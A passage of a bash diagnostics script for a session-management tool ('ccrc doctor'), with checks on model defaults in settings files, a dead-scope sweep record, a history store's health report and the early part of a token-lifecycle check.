      try { text = fs.readFileSync(process.env.CCRC_DOCTOR_SETTINGS, "utf8"); }
      catch (e) { process.stdout.write("READERR:" + (e && e.code ? e.code : "unknown")); process.exit(5); }
      let j;
      try { j = JSON.parse(text); } catch (e) { process.exit(3); }
      if (!j || typeof j !== "object" || Array.isArray(j)) process.exit(4);
      const env = j.env && typeof j.env === "object" && !Array.isArray(j.env) ? j.env : {};
      const set = (x) => typeof x === "string" && x !== "";
      let key, v;
      if (set(env.ANTHROPIC_MODEL)) { key = "env.ANTHROPIC_MODEL"; v = env.ANTHROPIC_MODEL; }
      else if (set(j.model)) { key = "model"; v = j.model; }
      else if (set(env.ANTHROPIC_DEFAULT_MODEL)) { key = "env.ANTHROPIC_DEFAULT_MODEL"; v = env.ANTHROPIC_DEFAULT_MODEL; }
      else process.exit(0);
      const show = (k, s) => k + "=" + (/^[A-Za-z0-9._\[\]-]{1,80}$/.test(s) ? s : "<a Fable-class id>");
      const alias = v.trim().toLowerCase().replace(/(\[1m\])+$/, "").trim();
      let said = null;
      if (alias === "fable" || v.includes("-fable-")) said = show(key, v);
      else if (alias === "best") said = show(key, v) + ", which resolves to Fable when the account is entitled to it";
      else if (/^[a-z]+$/.test(alias)) {
        const rk = "ANTHROPIC_DEFAULT_" + alias.toUpperCase() + "_MODEL";
        if (set(env[rk]) && env[rk].includes("-fable-")) said = show(key, v) + ", via " + show("env." + rk, env[rk]);
      }
      if (said === null) process.exit(0);
      process.stdout.write(said);
      process.exit(7);
    ' 2>/dev/null)"; rc=$?
    case "$rc" in
      0) ;;
      7) fab="${fab:+$fab, }$a ($out)" ;;
      5) why="${out#READERR:}"; [ -n "$why" ] && [ "$why" != "$out" ] || why=unreadable
         if [ "$why" = ENOENT ] && [ -L "$f" ]; then why="ENOENT, a symlink whose target is missing"; fi
         unread="${unread:+$unread, }$a ($why)" ;;
      3|4) unparsed="${unparsed:+$unparsed, }$a" ;;
      *) nodefail="${nodefail:+$nodefail, }$a (exit $rc)" ;;
    esac
  done <<<"$raw"
  rc=0
  if [ -n "$fab" ]; then
    _dr_warn model-default "an Anthropic lane's settings.json defaults the model to Fable: $fab — a session there with no routing record, or class \`default\`, starts on Fable (a dispatched worker whose run names no class included), although ccrc's routing never chooses Fable itself" \
      "in that lane's settings.json set \`model\` to Opus or remove it (and any env.ANTHROPIC_MODEL, env.ANTHROPIC_DEFAULT_MODEL or env.ANTHROPIC_DEFAULT_<ALIAS>_MODEL naming Fable); a \`/model\` typed with a name saves the account default, while \`s\` in the /model picker is session-only"
    rc=2
  fi
  if [ -n "$unread" ]; then
    _dr_warn model-default "unmeasured: settings.json is present but could not be read for: $unread, so whether it defaults the model to Fable is unknown" \
      "fix or remove it — a symlink whose target is missing, a directory in its place, or its mode/ownership (chmod u+r <home>/settings.json) — or check its \`model\` key and env.ANTHROPIC_MODEL by hand"
    rc=2
  fi
  if [ -n "$nodefail" ]; then
    _dr_warn model-default "unmeasured: the settings reader (node) failed for: $nodefail, so whether its settings.json defaults the model to Fable is unknown" \
      "check that node runs (node -e 0) — see the 'node' check above — then re-run ccrc doctor"
    rc=2
  fi
  if [ -n "$nodir" ]; then
    _dr_warn model-default "unmeasured: the roster projection names no config dir for: $nodir, so whether its settings.json defaults the model to Fable is unknown" \
      "re-run ccrc install to regenerate \$HOME/.ccrc/accounts.sh"
    rc=2
  fi
  if [ -n "$unparsed" ]; then
    _dr_warn model-default "unmeasured: settings.json is not a JSON object for: $unparsed, so whether it defaults the model to Fable is unknown" \
      "repair that lane's settings.json so it parses as a JSON object, then re-run ccrc doctor"
    rc=2
  fi
  [ "$rc" -eq 0 ] || return "$rc"
  _dr_pass model-default "$n Anthropic lane(s): no settings.json defaults the model to Fable"
}

# ── scope-sweep ───────────────────────────────────────────────────────────
# WHAT ccd-scope-sweep RECORDED — READ, NEVER RE-DERIVED (session-continuity
# spec §5.6 item 2, wave 4). The sweep keeps one verdict record,
# `$XDG_RUNTIME_DIR/ccd-scope-sweep.state`, rewritten whole every minute: a
# `dead` line per dead ccd pane scope (first seen dead on the sweep's
# boot-relative clock, verdict, why, server, processes and their pids, memory,
# sockets, its oldest process, the scope's own age — the header's `up=` dates
# the two clocks) and an `old` line per process older than a day in
# a LIVE pane scope that is neither the pane's own process nor one of its Claude
# Code's MCP servers. This check lists both, and asks nothing of systemd or
# /proc itself: two readers deriving "dead" twice is how they come to disagree,
# and the sweep's verdict is the one its stop acts on. Appended at the END of
# this file, for `_check_timeout`'s reason (lines above are cited by number).
#
# WARN, never FAIL — `_check_scopes`' argument: a dead scope is a runtime fact,
# and `ccrc install` ends with doctor. The remedy is the operator's: read the
# scope, then stop it, or move a service a session still needs into a unit of
# its own. The sweep itself stops only an INERT scope, and only once the
# operator has armed it; the record's header says which mode it ran in.
#
# TWO HALVES OF THE TIMER'S HEALTH. `_check_services` asks whether
# `ccd-scope-sweep.timer` is active (it is in `known`); this check asks whether
# its record is FRESH — a tick older than CCRC_SCOPE_SWEEP_STALE_S is a sweep
# that stopped. No record at all is a SKIP, never a WARN: a fresh install arms
# the timer two minutes before its first tick, and a reboot empties the runtime
# dir. SKIP on Darwin (no cgroup scopes), on a `server`-role box (no sessions),
# and while the operator has PAUSED the sweep (`~/.cc-sessions/scope-sweep-paused`:
# it then rewrites nothing, so its record ages by design — never a stopped timer).
# CCRC_SCOPE_SWEEP_STATE is the test seam, CCRC_CADDY_SYSTEM_FILE's shape.
_check_scope-sweep() {
  local _srv_role="" reg rec hdr tick up mode now age line n nd=0 no=0 bad=0 ln=0 stale
  local -a found=()
  # Every number this function does ARITHMETIC on is bounded here: a leading zero is an octal error that would abort the check
  # inside `$( … )` (doctor then FAILs it: no verdict line), and an unbounded digit run wraps. The writer re-reads `first=` with the
  # same bound. Each is ONE capture group, so the group numbers below do not move. A line that fails them is counted, never dropped.
  local N='(0|[1-9][0-9]{0,15})' M='(0|[1-9][0-9]{0,15}|\?)' O='(-1|0|[1-9][0-9]{0,15})'
  if [ "${CCD_OS:-linux}" = darwin ]; then
    _dr_skip scope-sweep "pane scopes are a Linux mechanism — no sweep runs on this box"; return 3
  fi
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip scope-sweep "this box records CCRC_ROLE=server, so it runs no pane scope and no sweep"; return 3
  fi
  reg="$HOME/.cc-sessions"   # the bare directory, never `.cc-sessions/<name>` on a code line: pool-name-parity.test.ts pins those
  if [ -e "$reg/scope-sweep-paused" ]; then
    _dr_skip scope-sweep "paused by the operator ($reg/scope-sweep-paused exists): the sweep measures, records and stops nothing until that file is removed"; return 3
  fi
  rec="${CCRC_SCOPE_SWEEP_STATE:-${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/ccd-scope-sweep.state}"
  if [ ! -e "$rec" ]; then
    _dr_skip scope-sweep "no verdict record at $rec — the sweep is not installed here, or has not run since its timer was armed or the box booted (\`services\` asks after the timer)"; return 3
  fi
  { IFS= read -r hdr < "$rec"; } 2>/dev/null || hdr=""
  if ! [[ "$hdr" =~ ^\#\ ccd-scope-sweep\ v1\ tick=${N}\ up=${N}\ mode=(shadow|live)$ ]]; then
    _dr_warn scope-sweep "the verdict record at $rec is unreadable or not a v1 record, so its dead scopes cannot be listed" \
      "let the sweep rewrite it: systemctl --user start ccd-scope-sweep.service; then re-run doctor"
    return 2
  fi
  tick=${BASH_REMATCH[1]} up=${BASH_REMATCH[2]} mode=${BASH_REMATCH[3]}
  now=$(date +%s); age=$(( now - tick ))
  stale=${CCRC_SCOPE_SWEEP_STALE_S:-300}; [[ "$stale" =~ ^[1-9][0-9]{0,8}$ ]] || stale=300   # a non-number would abort the arithmetic below
  if (( age > stale )); then
    _dr_warn scope-sweep "the verdict record is ${age}s old — the sweep runs every minute, so it has stopped, and its dead-scope report is stale" \
      "systemctl --user status ccd-scope-sweep.timer ccd-scope-sweep.service; journalctl --user -u ccd-scope-sweep.service"
    return 2
  fi
  while IFS= read -r line; do
    ln=$((ln + 1)); [ "$ln" -eq 1 ] && continue   # the header, read above
    if [[ "$line" =~ ^dead\ (tmux-spawn-[^ ]+\.scope)\ first=${N}\ .*verdict=([a-z-]+)\ why=([^ ]+)\ server=([a-z]+)\ procs=([0-9]+)\ mem=${M}\ sockets=([0-9]+)\ youngest=-?[0-9]+\ oldest=${O}\ age=${N}\ pids=([0-9,]+)$ ]]; then
      local -a m=("${BASH_REMATCH[@]}")   # copied first: the `=~` below overwrites BASH_REMATCH
      n=${m[7]}; [[ "$n" =~ ^[0-9]+$ ]] && n="$(( n / 1048576 )) MiB"
      found+=("${m[1]} dead $(( (up - m[2]) / 60 )) min, the scope $(( m[10] / 3600 )) h old, its oldest process $(( m[9] / 3600 )) h: ${m[6]} process(es) (pids ${m[11]}), $n, ${m[8]} socket(s), its server ${m[5]}, ${m[3]} (${m[4]})")
      nd=$((nd + 1))
    elif [[ "$line" =~ ^old\ (tmux-spawn-[^ ]+\.scope)\ pid=([0-9]+)\ age=${N}\ comm=([^ ]*)$ ]]; then
      found+=("${BASH_REMATCH[1]} live: pid ${BASH_REMATCH[2]} (${BASH_REMATCH[4]}) running $(( BASH_REMATCH[3] / 3600 )) h")
      no=$((no + 1))
    elif [ -n "$line" ]; then
      bad=$((bad + 1))   # a line under a good header that neither shape reads: said, never PASSed over
    fi
  done < "$rec"
  (( bad )) && found+=("$bad line(s) it cannot read")
  if [ "${#found[@]}" -eq 0 ]; then
    # "the sweep could measure": a dead scope it could NEVER measure (never seen measurable) gets no line in the record, so an
    # unqualified "no dead pane scope" could be false.
    _dr_pass scope-sweep "no dead pane scope the sweep could measure, and no process older than a day in a live one (the sweep's record, ${age}s old, mode $mode)"
    return 0
  fi
  local detail="" x
  for x in "${found[@]}"; do detail="${detail}${detail:+; }${x}"; done
  _dr_warn scope-sweep "$nd dead pane scope(s) and $no long-lived process(es) in live ones, from the sweep's record (mode $mode): $detail" \
    "read each before acting: \`systemctl --user stop <unit>\` ends EVERY process in a dead scope; a service a session still needs is moved into a unit of its own (systemd-run --user --unit …); a forgotten process in a live pane is the session's to end. The sweep stops only scopes inert for six hours, and only when armed"
  return 2
}

# ── history: the session-history store ────────────────────────────────────
# ccrc history W1-B1 (spec 2026-10-05-ccrc-history-lossless-dag-design.md
# §9.6). APPENDED HERE, at the end of the file (after `_check_scope-sweep`),
# for that check's own reason: lines in this file are cited by number from
# `ccrc` and the tests, so a function inserted mid-file would move every one
# of them. Its table entry shares `models codex docs`'s line for the same
# reason.
#
# THIS CHECK DECIDES NOTHING ABOUT THE STORE. Every rule of §9.6 — the
# freshness FAILs, the state words that hold them back, the store refusals,
# the modes, the export's gap guard — is `deriveHealth` in
# `ccd/history/lib.mjs`, and `ccrc history status --json` carries its answer
# as `health`. Here the box is gated, that one bounded call is made, and its
# answer RELAYED: each `health.fail[]` item a FAIL line, each
# `health.warn[]` item a WARN line, each with the item's own remedy, and the
# worse class returned. A rule restated here would be a second rule that
# drifts from the first; `single-definition.test.ts` (O14) binds every word
# this function spells to `HEALTH_WORDS`, and the only one it spells is
# status-unreadable.
#
# GATING, in this order (D-4258):
#  1. a box that records CCRC_ROLE=server SKIPs FIRST, read exactly as
#     `_check_skills` reads it, so a shim left behind by a re-role can never
#     turn a server box's doctor red;
#  2. a box with no `~/.local/bin/ccd-history-sweep` SKIPs. The SHIM, not
#     the timer file: a container backend carries the sweep with no unit
#     file at all, and a timer-keyed gate would SKIP a dead sweep there for
#     good. `ccrc install` places the shim off server boxes only, so on a
#     fresh install the two arms agree;
#  3. the rest is status's. Within two sweep periods of the shim's mtime,
#     with no tick yet, it answers PASS `first-tick-pending`
#     (D-4168: a fresh install ends green, the ruling
#     `ccrc-install.test.ts` pins), and the states in which no fresh tick is
#     expected answer as WARNs ahead of any freshness FAIL
#     (D-4251).
#
# NO SWITCH IS SPELLED HERE (O13): status reports the cap file as `cap_file`
# and the capture switch as the `off` word.
#
# BOUNDED by `CCRC_DOCTOR_GH_TIMEOUT`, the knob that already bounds this
# file's tmux and openssl calls: a store on a dead volume blocks every stat
# on it, and that must read as a FAIL, never as a hung doctor.

# The store's filesystem against `/`, by device: information on the PASS line
# only (§9.3). MEASURED ONCE, by status (`store_device`: `root`, `own`, or
# null when db/ was not measurable within its stat deadline; Task 28), and
# only WORDED here, so doctor and status can never disagree about it.
_dr_history_fs() {
  case "${1:-}" in
    root) printf '%s' "the store is on the root filesystem" ;;
    own)  printf '%s' "the store is on a filesystem of its own, not the root's" ;;
    *)    printf '%s' "its filesystem was not measured" ;;
  esac
}

_check_history() {
  if [ -z "${BOX_ENV_FILE:-}" ] || [ -z "${CCRC_HERE:-}" ] \
     || ! declare -F _box_env_value >/dev/null 2>&1 \
     || ! declare -F _plat_timeout >/dev/null 2>&1; then
    _dr_fail history "ccrc's own config reader is not loaded, so neither this box's role nor its history store was measured" \
      "this is a bug in ccrc, not a fact about your box — the check table was sourced by something that is not ccrc"
    return 1
  fi
  local role=""
  # -f BEFORE -r: `_check_skills`' guard order, for its reason (a directory answers -r too).
  [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ] && role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$role" = server ]; then
    _dr_skip history "this box records CCRC_ROLE=server, so it hosts no sessions and keeps no history store"
    return 3
  fi
  local shim="$HOME/.local/bin/ccd-history-sweep"
  if [ ! -e "$shim" ]; then
    # Never spell the installer's command in this sentence: a SKIP carries no
    # remedy, and the env-less fleet-box case ('SKIPS an env-less FLEET-ROLE
    # box…') asserts that box's WHOLE doctor output never says it. That
    # fixture has no shim, so this line prints there.
    _dr_skip history "no ccd-history-sweep at $shim — this box never installed the history sweep (macOS installs none, and the installer places it on every role but server)"
    return 3
  fi
  if ! command -v jq >/dev/null 2>&1; then
    _dr_warn history "jq is not on PATH, so ccrc history status --json could not be read — see the 'jq' check above" \
      "install jq (the 'jq' check above names what is missing), then re-run ccrc doctor"
    return 2
  fi

  local cli="$CCRC_HERE/history/cli.mjs" out rc log
  log="$(_dr_log_hint ccd-history-sweep.service)"
  out="$(_plat_timeout "$CCRC_DOCTOR_GH_TIMEOUT" node --no-warnings "$cli" status --json 2>/dev/null)"; rc=$?
  if [ "$rc" -eq 124 ]; then
    _dr_fail history "status-unreadable: ccrc history status --json did not answer within ${CCRC_DOCTOR_GH_TIMEOUT}s — a store on a hung filesystem blocks every stat on it" \
      "check the store's mount (ls -ld \$HOME/.ccrc/history/db/), then re-run ccrc doctor; the sweep's own log: $log"
    return 1
  fi
  # THE REPORT IS CHECKED BEFORE ONE WORD OF IT IS PRINTED: a word this check
  # cannot vouch for is never relayed as a verdict. A non-zero exit with a
  # well-formed report is normal (a store refusal answers exit 5 and says so
  # in `health`), so the exit code alone decides nothing here.
  if ! printf '%s' "$out" | jq -e '
        type == "object"
        and (.health | type) == "object"
        and (.health.fail | type) == "array"
        and (.health.warn | type) == "array"
        and ((.health.pass == null) or ((.health.pass | type) == "string" and (.health.pass | test("^[a-z][a-z0-9-]*$"))))
        and ([.health.fail[], .health.warn[]]
             | all(type == "object"
                   and (.word | type) == "string" and (.word | test("^[a-z][a-z0-9-]*$"))
                   and (.detail | type) == "string" and (.remedy | type) == "string"))' >/dev/null 2>&1; then
    _dr_fail history "status-unreadable: ccrc history status --json exited $rc and printed nothing this check can read as a health report" \
      "run it by hand to see why: node --no-warnings $cli status; the sweep's own log: $log"
    return 1
  fi

  local nitems
  nitems="$(printf '%s' "$out" | jq -r '(.health.fail | length) + (.health.warn | length)')"
  if [ "$nitems" -gt 0 ]; then
    # One field separator that is not IFS whitespace (an empty field stays a
    # field), and every tab or newline inside a field flattened first — the
    # contract is "the line after a non-PASS verdict is its remedy".
    local cls word detail remedy worst=2
    while IFS=$'\x1f' read -r cls word detail remedy; do
      case "$cls" in
        FAIL) _dr_fail history "$word: $detail" "$remedy"; worst=1 ;;
        *)    _dr_warn history "$word: $detail" "$remedy" ;;
      esac
    done < <(printf '%s' "$out" | jq -r '(.health.fail[] | ["FAIL", .word, .detail, .remedy]), (.health.warn[] | ["WARN", .word, .detail, .remedy]) | map(gsub("[\t\n\r]"; " ")) | join("\u001f")')
    return "$worst"
  fi

  local sid pass xc reason facts dev
  sid="$(printf '%s' "$out" | jq -r '.store_id // "none yet"')"
  dev="$(printf '%s' "$out" | jq -r '.store_device // empty')"
  pass="$(printf '%s' "$out" | jq -r '.health.pass // empty')"
  xc="$(printf '%s' "$out" | jq -r '.exit // empty')"
  reason="$(printf '%s' "$out" | jq -r '.reason // empty')"
  if [ -z "$pass" ] && [ "$xc" = 9 ]; then
    _dr_skip history "ccrc history status answers exit 9${reason:+ ($reason)}: this box keeps no history store"
    return 3
  fi
  if [ -z "$pass" ] && [ -n "$xc" ] && [ "$xc" != 0 ]; then
    _dr_fail history "status-unreadable: ccrc history status --json exited $xc${reason:+ ($reason)} and reported no health verdict" \
      "run it by hand to see why: node --no-warnings $cli status; the sweep's own log: $log"
    return 1
  fi
  facts="$(printf '%s' "$out" | jq -r '"last tick " + (if (.last_tick_ms | type) == "number" then (((now * 1000 - .last_tick_ms) / 1000 | floor | tostring) + "s ago") else "none yet" end) + ", lag " + (if (.lag | type) == "number" then ((.lag | floor | tostring) + "s") else ((.lag // "unmeasured") | tostring) end)')"
  _dr_pass history "${pass:+$pass: }store $sid: $facts; $(_dr_history_fs "$dev")"
}

# ── box-token: the box token's lifecycle, on each box ─────────────────────
# APPENDED HERE, with its table entry on `auth`'s line, for `_check_timeout`'s reason: lines in this file are
# cited by number from `ccrc`, the tests and the docs, and a function inserted mid-file would move every one.
#
# WHAT IS MEASURED (box-token lifecycle spec 4.8). The SERVER arm, on a `server` or `both` box: `mail.token`
# (present, a regular file, mode 0600, a value line by the extraction rule) and `box-token.json`, the server's
# state record (generation, last rotation, owed, hold, failures, a pending value past its deadline, the
# fleet's confirmed generation, retired values presented, the last boot recovery). The FLEET arm, on a `fleet`
# or `both` box: `~/.cc-secrets/ccrc-mail.token` the same way, the generation file, and `ccrc token sync`'s
# last report with its proof word and transport. D-3111's server-role skip NEVER covers this check: a server
# box is where the server arm's subject lives. No role recorded: the server arm when the server's token or
# state file exists, the fleet arm when `~/.ccrc/agent.env` does, else SKIP `no-role`.
#
# NEVER A VALUE, A CODE OR A HASH OF EITHER. The token files are read in THIS process, line by line, by the
# extraction rule every reader shares (`extractToken`: the first line that is neither blank nor a `#` comment,
# all whitespace removed), only to learn whether a value line exists; the value is never echoed, passed to a
# child, hashed or kept. The two JSON files hold no secret and are read by `python3 -I -c` (isolated: no cwd or environment on its path), whose output is
# words and numbers this function validates again before any of it reaches a line.
#
# WAVE 1 PRINTS PASS OR SKIP ONLY (D-4391; the operator's ruling of 2026-10-07, 15:30). Every state that will
# be a FAIL or a WARN prints `SKIP box-token: <arm>: <word> — <sentence>; reported as SKIP until the FAIL and
# WARN arms ship`, never PASS: a PASS there is the one way an operator reads a stalled first retirement as
# healthy. The arms are compiled in behind `_BT_ARMS_ON` and proven by `doctor-box-token.test.ts`, which flips
# it in a copy of this file; the follow-up PR flips it here, before the weekly schedule ships. There is no
# flag file, because a flag nobody writes is a hand step. `transport http` is printed on a PASS line and is
# never a verdict.
#
# THE WORDS ARE L0's, pinned by `doctor-box-token.test.ts`: `_BT_HOLDS` is `TOKEN_HOLDS`, `_BT_OWED` is
# `OWED_REASONS`, `_BT_ORIGINS` is `TOKEN_ORIGINS` (`shared/box-token.ts`); `_BT_SYNC_ERRORS` is
# `TOKEN_SYNC_OP_ERRORS` and `_BT_TRANSPORTS` is `TOKEN_TRANSPORTS` (`shared/agent-protocol.ts`); `_BT_FAIL_AT`
# is `FAILURES_FOR_BANNER`, `_BT_PENDING_CAP` is `PENDING_HARD_CAP` and `_BT_TICK_MS` is `DRIVER_TICK_MS`
# (`server/src/token/policy.ts`). `_BT_LOST_WORDS` are the rest of `BoxTokenView.lastFailure`'s vocabulary, which
# has no L0 list of its own: `link.ts`'s non-exported `LOST_WORDS` (pinned by a text scan of that file) plus
# `mint-failed`, the one word `link.ts` does not list (the console view's word for a failed mint). The state record
# CAN hold it, as `lastFailure`: the driver commits `lastFailure: 'mint-failed'` on a failed stage write.
# D-4551's two words are doctor-local, like `pending-overdue`: `retire-overdue:<min>` (a previous value more than
# one driver tick past its `hardUntil`) and `retiring-unlanded:<min>` (the oldest `retiring` digest older than two
# ticks, one tick plus one tick of slack). "In grace" is never printed past `hardUntil`.
#
# `set +x` is the function's first statement, not the file's: this file is sourced into `ccrc`, and doctor runs
# each check in its own `$( … )`, so it cannot leak; it writes nothing, so it sets no umask (a file-level
# `umask 077` would reach every `--fix` writer).
_BT_ARMS_ON=0
_BT_HOLDS=(update-in-flight agent-predates-op verb-missing stale-client fleet-rows node-id-unmeasured link-down pending-cap no-coord role-unrecorded mint-failed)
_BT_OWED=(adopted fleet-behind confirm-deadline retired-written-back recovered aux-unusable unverifiable-files code-used claim-misbound retired-presented)
_BT_ORIGINS=(adopted minted rotated)
_BT_SYNC_ERRORS=(bad-code busy spawn-failed claim-refused code-used write-failed proof-failed proof-unmeasured stale-client)
_BT_TRANSPORTS=(http https)
_BT_FILE_PROBLEMS=(missing unusable placeholder unreadable changed retired)
_BT_LOST_WORDS=(timeout disconnected aborted mint-failed)
_BT_FAIL_AT=3
_BT_PENDING_CAP=3
_BT_TICK_MS=60000
_BT_SKIP_TAIL='; reported as SKIP until the FAIL and WARN arms ship'

# The server's state record, read strictly: any field missing or of the wrong kind is `unreadable`, never a
# default. Prints `absent`, `unreadable`, or `ok` then `<key> <value>` lines and `finding <word> [<n>] [<node>]`.
# argv: path, origins, holds, owed reasons, last-failure words, transports, file-problem words (each space-joined),
# the pending cap, the driver tick in ms. Times are ms.
# The shape is `isBoxTokenState`'s (server/src/token/files.ts) as of D-4413/D-4414: up to PENDING_HARD_CAP
# pending entries (argv, `_BT_PENDING_CAP`), a `recovering` key, `fileProblem` and `retiring` optional (`retiring`
# is a list of {sha256, at} awaiting their append: only the oldest `at` is read, no digest is kept or printed).
# `v` must be the integer 1 (not `true`). D-4551: two doctor-local findings, `retire-overdue` and `retiring-unlanded`.
_BT_PY_STATE='
import json, os, re, stat, sys, time
def say(*a):
    print(" ".join(str(x) for x in a))
def bad():
    say("unreadable")
    sys.exit(0)
p = sys.argv[1]
origins, holds, owed, fails, transports, fileprobs = (set(a.split()) for a in sys.argv[2:8])
cap, tick = int(sys.argv[8]), int(sys.argv[9])
now = int(time.time() * 1000)
H16 = re.compile(r"[0-9a-f]{16}\Z")
H64 = re.compile(r"[0-9a-f]{64}\Z")
NODE = re.compile(r"[A-Za-z0-9._:-]{1,64}\Z")
try:
    st = os.lstat(p)
except FileNotFoundError:
    say("absent")
    sys.exit(0)
except OSError:
    bad()
if not stat.S_ISREG(st.st_mode) or st.st_size > 65536:
    bad()
try:
    with open(p, "rb") as f:
        s = json.loads(f.read().decode("utf-8"))
except Exception:
    bad()
def n(v): return type(v) is int and v >= 0
def on(v): return v is None or n(v)
def d(v): return type(v) is dict
def hid(v): return type(v) is str and H16.match(v) is not None
def opt(v, f): return v is None or f(v)
try:
    c = s["current"]; ls = s["lastSync"]; br = s["lastBootRecovery"]; pv = s["previous"]; k = s["counters"]
    fp = s.get("fileProblem")   # optional: absent in a state written before the re-read existed
    rt = s.get("retiring")      # optional (D-4410): a list of {sha256, at}
    ok = (d(s) and type(s["v"]) is int and s["v"] == 1 and s["origin"] in origins and type(s["rotationOwed"]) is bool
        and opt(s["owedWhy"], lambda w: w in owed) and (not s["rotationOwed"] or s["owedWhy"] in owed)
        and d(c) and n(c["seq"]) and n(c["since"]) and opt(c["id"], hid)
        and type(s["pending"]) is list and len(s["pending"]) <= cap
        and all(d(g) and hid(g["id"]) and n(g["seq"]) and on(g["handedOutAt"]) and on(g["confirmBy"]) for g in s["pending"])
        and opt(pv, lambda x: d(x) and n(x["graceUntil"]) and n(x["hardUntil"]))
        and opt(s["promoting"], d) and opt(s["recovering"], d) and n(s["nextSeq"]) and opt(s["fleetConfirmed"], hid)
        and on(s["lastRotationAt"]) and n(s["failures"]) and opt(s["lastFailure"], lambda w: type(w) is str)
        and opt(s["hold"], lambda w: w in holds) and opt(s["holdNode"], lambda w: type(w) is str)
        and opt(ls, lambda x: d(x) and n(x["at"]) and type(x["word"]) is str)
        and d(k) and n(k["previousPresented"]) and n(k["retiredPresented"])
        and on(s["mintFailedAt"]) and opt(br, lambda x: d(x) and n(x["at"]))
        and on(s["retiredRefusedAt"])
        and opt(fp, lambda x: d(x) and n(x["at"]) and x["file"] in ("current", "pending", "previous") and x["word"] in fileprobs)
        and opt(rt, lambda x: type(x) is list and all(d(e) and type(e["sha256"]) is str and H64.match(e["sha256"]) is not None and n(e["at"]) for e in x)))
except (KeyError, TypeError, IndexError, AttributeError):
    ok = False
if not ok:
    bad()
def age(t): return max(0, (now - t) // 1000)
say("ok")
say("seq", c["seq"])
say("since", age(c["since"]))
lr = s["lastRotationAt"]
say("rotated", "never" if lr is None else age(lr))
say("rotating", 1 if (s["pending"] or s["promoting"] is not None) else 0)
say("grace", 1 if (pv is not None and now <= pv["hardUntil"]) else 0)
say("refused", 0 if s["retiredRefusedAt"] is None else 1)
if s["mintFailedAt"] is not None:
    say("finding", "mint-failed", age(s["mintFailedAt"]))
# D-4551: a previous value past its hard bound (plus one driver tick) is still here, and a retired digest whose
# append has not landed (older than two ticks) is the only copy of that record. Minutes, floored.
if pv is not None and now > pv["hardUntil"] + tick:
    say("finding", "retire-overdue", (now - pv["hardUntil"]) // 60000)
if rt:
    oldest = min(e["at"] for e in rt)
    if now - oldest > 2 * tick:
        say("finding", "retiring-unlanded", (now - oldest) // 60000)
if s["hold"] is not None and not (s["hold"] == "mint-failed" and s["mintFailedAt"] is not None):
    hn = s["holdNode"]
    say("finding", "held:" + s["hold"], 0, hn if hn is not None and NODE.match(hn) else "-")
f = s["failures"]; lf = s["lastFailure"]
if f > 0:
    say("finding", "failed:" + (lf if lf in fails else "other"), f)
over = [now - g["confirmBy"] for g in s["pending"] if g["confirmBy"] is not None and now > g["confirmBy"]]
if over:
    say("finding", "pending-overdue", max(over) // 1000)
if s["rotationOwed"]:
    say("finding", "rotation-owed:" + s["owedWhy"])
if ls is not None and ls["word"] == "proof-unmeasured" and not (f > 0 and lf == "proof-unmeasured"):
    say("finding", "proof-unmeasured", age(ls["at"]))
if br is not None and (lr is None or lr < br["at"]):
    say("finding", "recovered", age(br["at"]))
if k["retiredPresented"] > 0:
    say("finding", "retired-presented", k["retiredPresented"])
if fp is not None:
    say("finding", "file:" + fp["word"], age(fp["at"]), fp["file"])
if c["id"] is not None and s["fleetConfirmed"] != c["id"]:
    say("finding", "fleet-behind")
elif c["id"] is None and not s["rotationOwed"]:
    say("finding", "fleet-unconfirmed")
'

# The fleet's generation file and `ccrc token sync`'s report. Prints `finding <word> [<age s>]` lines, `own`
# (own-write box: no report is read) or `synced <transport> <age s>`. argv: generation path, report path,
# own-write 0|1, sync error words, transports. The report's `at` is unix seconds.
_BT_PY_FLEET='
import json, os, re, stat, sys, time
def say(*a):
    print(" ".join(str(x) for x in a))
gp, rp, own = sys.argv[1], sys.argv[2], sys.argv[3] == "1"
errs, transports = set(sys.argv[4].split()), set(sys.argv[5].split())
now = int(time.time())
def regular(p):
    try:
        st = os.lstat(p)
    except FileNotFoundError:
        return "absent"
    except OSError:
        return "bad"
    return "ok" if stat.S_ISREG(st.st_mode) and st.st_size <= 65536 else "bad"
g = regular(gp)
if g == "absent":
    say("finding", "no-generation")
else:
    try:
        with open(gp, "rb") as f:
            b = f.read()
    except OSError:
        b = b""
    if g != "ok" or re.fullmatch(rb"[0-9a-f]{16}\n", b) is None:
        say("finding", "generation-malformed")
if own:
    say("own")
    sys.exit(0)
r = regular(rp)
if r == "absent":
    say("finding", "never-synced")
    sys.exit(0)
def unreadable():
    say("finding", "sync-unreadable")
    sys.exit(0)
if r != "ok":
    unreadable()
try:
    with open(rp, "rb") as f:
        j = json.loads(f.read().decode("utf-8"))
    res, at, gen, tr, pf = j["result"], j["at"], j["generation"], j["transport"], j["proof"]
    ok = (type(j) is dict and j["v"] == 1 and type(at) is int and at >= 0 and (res == "synced" or res in errs)
        and (gen is None or (type(gen) is str and re.fullmatch(r"[0-9a-f]{16}", gen) is not None))
        and (tr is None or tr in transports) and pf in (None, "proved", "proof-failed", "proof-unmeasured"))
except Exception:
    ok = False
if not ok:
    unreadable()
age = max(0, now - at)
if res == "synced":
    if pf != "proved" or tr is None:
        unreadable()
    say("synced", tr, age)
elif res == "proof-unmeasured":
    say("finding", "proof-unmeasured", age)
else:
    say("finding", "sync:" + res, age)
'

_bt_num() { [[ "$1" =~ ^(0|[1-9][0-9]{0,15})$ ]]; }
_bt_member() { local x="$1" y; shift; for y in "$@"; do [ "$y" = "$x" ] && return 0; done; return 1; }
_bt_age() {   # <seconds> -> "45 s", "12 min", "3 h", "2 d"
  local s="$1"
  if [ "$s" -lt 120 ]; then printf '%s s' "$s"
  elif [ "$s" -lt 7200 ]; then printf '%s min' "$((s / 60))"
  elif [ "$s" -lt 172800 ]; then printf '%s h' "$((s / 3600))"
  else printf '%s d' "$((s / 86400))"; fi
}

# <path> -> BT_TF: ok | absent | not-regular | unreadable | no-value, and BT_TF_MODE (octal, empty if unread).
# Absent is `! -e` AND `! -L`: a dangling link is present and not a regular file, never absent.
_bt_value_file() {
  local p="$1" line="" t=""
  BT_TF=""; BT_TF_MODE=""
  if [ ! -e "$p" ] && [ ! -L "$p" ]; then BT_TF=absent; return 0; fi
